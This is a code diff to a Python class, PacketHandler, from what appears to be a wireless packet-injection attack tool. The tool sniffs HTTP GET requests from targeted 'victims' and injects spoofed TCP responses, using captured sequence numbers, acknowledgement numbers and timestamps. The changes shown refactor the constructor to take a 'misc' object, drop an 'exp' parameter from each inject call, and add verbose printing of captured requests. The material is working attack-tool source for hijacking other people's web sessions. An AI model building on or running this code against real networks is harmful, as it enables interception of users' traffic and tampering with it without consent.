@@ -22,7 +22,8 @@ class PacketHandler(object):
     directly if working in broadcast mode and attacking all clients.
     """
 
-    def __init__(self, expSocket, exp, *positional_parameters, **keyword_parameters):
+    ### Work on moving misc, within * or **
+    def __init__(self, misc, *positional_parameters, **keyword_parameters):
         if ('victims' in keyword_parameters):
             self.victims=keyword_parameters['victims']
         else:
@@ -58,9 +59,8 @@ class PacketHandler(object):
             
         self.newvictims = []
         self.injector = Injector(self.i)
-        
-        self.exp = exp
-        self.expSocket = expSocket
+        self.expSocket = misc.expSocket
+        self.verbose = misc.verbose
 
     def proc_excluded(self, excluded):
         """Check if argument provided in excluded is an ip.
@@ -173,9 +173,9 @@ class PacketHandler(object):
                         if (ip2 == svrip):
                             BLOCK_HOSTS.remove((ip2, seq2))
 
-            ## Look for desired plaintext here
-            #print request
             if 'GET /' in request:
+                if self.verbose and request:
+                    print '\n\n%s' % request
                 pass
             else:
                 return 0
@@ -183,8 +183,6 @@ class PacketHandler(object):
             #print request
 
             ### Perhaps do the Victim removal from single list here?
-            ### No idea yet, still tracing code and deciding..
-            ### Leaving single code for now
             if single:
                 try:
                     TSVal, TSecr = packet.getlayer(TCP).options[2][1]
@@ -443,7 +441,7 @@ class PacketHandler(object):
 
                             #print injection
                             ### Broadcast injector is here
-                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.exp, self.expSocket, single)
+                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket, single)
 
                 else:
                     if (victim.mac is not None):
@@ -458,7 +456,7 @@ class PacketHandler(object):
                                     else:
                                         return 0
                                 #print injection
-                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.exp, self.expSocket)
+                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket)
 
         else:
             if (self.victim_parameters is not None):
@@ -487,7 +485,7 @@ class PacketHandler(object):
                                         return 0
 
                                 #print injection
-                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.exp, self.expSocket)
+                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket)
 
                     else:
                         if (victim.mac is not None):
@@ -503,7 +501,7 @@ class PacketHandler(object):
                                             return 0
 
                                     #print injection
-                                    self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.exp, self.expSocket)
+                                    self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket)
 
             if (self.excluded is not None):
                 if (svrip in self.excluded):
@@ -529,7 +527,7 @@ class PacketHandler(object):
                                     return 0
 
                             #print injection
-                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.exp, self.expSocket)
+                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket)
 
                 else:
                     if (victim.mac is not None):
@@ -551,7 +549,7 @@ class PacketHandler(object):
 
                                 #print injection
                                 #print host, filename
-                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.exp, self.expSocket)
+                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket)
 
 
     def process(self, interface, pkt, single, args):
